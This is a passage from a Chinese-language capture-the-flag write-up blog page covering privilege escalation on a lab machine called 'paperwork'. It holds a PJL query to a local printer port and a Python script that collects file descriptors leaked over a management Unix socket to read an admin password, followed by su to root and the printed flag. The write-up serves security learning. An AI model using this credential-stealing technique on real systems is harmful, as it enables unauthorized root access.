+</span></span></span><span class="line"><span class="cl"><span class="s2">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span></span><span class="line"><span class="cl"><span class="s2">s.connect((&#39;127.0.0.1&#39;, 9100))
+</span></span></span><span class="line"><span class="cl"><span class="s2">s.send(b&#39;@PJL FSQUERY NAME=\&#34;0:\&#34;\r\n&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">print(s.recv(1024))
+</span></span></span><span class="line"><span class="cl"><span class="s2">s.close()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接收到泄露的文件描述符并读取密码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">&gt;</span> <span class="n">root</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;&lt;</span><span class="s1">&#39;EOF&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">array</span><span class="o">,</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&#34;/run/paperwork/mgmt.sock&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msg</span><span class="p">,</span> <span class="n">ancdata</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvmsg</span><span class="p">(</span><span class="mi">4096</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">CMSG_LEN</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fds</span> <span class="o">=</span> <span class="n">array</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="s2">&#34;i&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">ancdata</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fds</span><span class="o">.</span><span class="n">frombytes</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="n">fds</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">pread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">EOF</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后执行文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">archivist@paperwork:~$ python3 root.py 
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">ADMIN_PASSWORD</span><span class="o">=</span>ApparelMortuaryCedar22
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过密码切换到 root。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">archivist@paperwork:~$ su - root
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">Last login: Tue Jul  <span class="m">7</span> 13:54:13 UTC <span class="m">2026</span> from 10.10.14.84 on ssh
+</span></span><span class="line"><span class="cl">root@paperwork:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@paperwork:~# cat root.txt 
+</span></span><span class="line"><span class="cl">f5da140ee8dbbb1e0be64d45b1f40eb4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 root flag：<code>f5da140ee8dbbb1e0be64d45b1f40eb4</code></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/21.-management/">
+        
+        
+            <div class="article-image">
+                <img src="/p/21.-management/assets/image-20261116114201933.9b55a8bff3905d1b0c01ae464826338d_hu18239252589493051653.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 21. Management"
+                        
+                        data-hash="md5-m1Wov/OQXRsMAa5GSCYzjQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">21. Management</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/20.-cohort/">
+        
+        
+            <div class="article-image">
+                <img src="/p/20.-cohort/assets/image-20261115120600328.38f02db0be810627914dd5f09bcaf8b0_hu13563524453460121695.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 20. Cohort"
+                        
+                        data-hash="md5-OPAtsL6BBieRTdXwm8r4sA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">20. Cohort</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/19.-doubletake/">
+        
+        
+            <div class="article-image">
+                <img src="/p/19.-doubletake/assets/image-20261113211115576.69ccc0ab3b3b5141786756fb894ded08_hu5599740394217170900.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 19. DoubleTake"
+                        
+                        data-hash="md5-aczAqzs7UUF4Z1b7iU3tCA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">19. DoubleTake</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+.article-content .highlight-wrap {
+  position: relative;
+  overflow: hidden;
+  border-radius: var(--card-border-radius);
+}
+.article-content .highlight-wrap .highlight {
+  margin:0;
+}
+ 
+.article-content .highlight-wrap.collapse {
+  max-height: 380px;
+}
+ 
+.article-content .highlight-wrap.collapse::after {
+  content: "";
+  position: absolute;
+  left:0;
+  bottom:0;
+  width:100%;
+  height: 80px;
+  background: linear-gradient(transparent, var(--pre-background-color));
+  pointer-events: none;
+}
+ 
+.article-content .code-expand-btn {
+  position:absolute;
+  bottom:8px;
+  right:12px;
+  z-index:2;
+  border: none;
+  padding: 4px 8px;
+  border-radius: 6px;
+  background: var(--card-background);
+  color: var(--text-color);
+  cursor: pointer;
+}
+</style>
+<script>
+document.addEventListener('DOMContentLoaded', ()=>{
+  document.querySelectorAll('.highlight-wrap').forEach(wrap=>{
+    const btn = wrap.querySelector('.code-expand-btn');
+    btn.addEventListener('click', ()=>{
+      wrap.classList.toggle('collapse');
+      btn.innerText = wrap.classList.contains('collapse') ? "▼ 展开" : "▲ 收起";
+    })
+  })
+})
+</script>
+
+    </body>
+</html>
